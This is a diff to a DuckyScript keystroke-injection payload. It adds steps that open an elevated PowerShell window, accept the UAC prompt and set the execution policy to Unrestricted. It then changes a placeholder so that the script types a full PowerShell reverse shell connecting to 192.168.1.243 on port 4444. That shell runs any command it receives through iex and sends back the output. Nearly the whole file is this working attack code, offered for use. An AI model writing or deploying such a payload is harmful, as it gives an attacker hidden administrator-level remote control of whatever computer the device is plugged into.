@@ -7,18 +7,32 @@ REM Open the Run Dialog
 GUI r
 DELAY 500
 
+GUI r
+DELAY 500
+STRING PowerShell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 500 
+LEFT
+DELAY 200
+ENTER
+DELAY 2000
+STRING Set-ExecutionPolicy Unrestricted
+DELAY 200
+ENTER
+DELAY 200
+A
+DELAY 100
+ENTER
+DELAY 500
+
+
 REM Open PowerShell hidden and as Administrator
 STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs"
 ENTER
 DELAY 1500
 
-REM Handle the UAC (User Account Control) prompt if it appears
-REM Press Left Arrow then Enter to accept admin rights
-LEFT
-DELAY 200
-ENTER
-DELAY 1000
 
 REM Type the connection payload (Be sure to replace IP_ADDRESS with your PC's IP)
-STRING $c = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> '; $sbyte = [text.encoding]::ASCII.GetBytes($sb2); $s.Write($sbyte,0,$sbyte.Length); $s.Flush()}; $c.Close()
+STRING $c = New-Object System.Net.Sockets.TCPClient('192.168.1.243',4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> '; $sbyte = [text.encoding]::ASCII.GetBytes($sb2); $s.Write($sbyte,0,$sbyte.Length); $s.Flush()}; $c.Close()
 ENTER
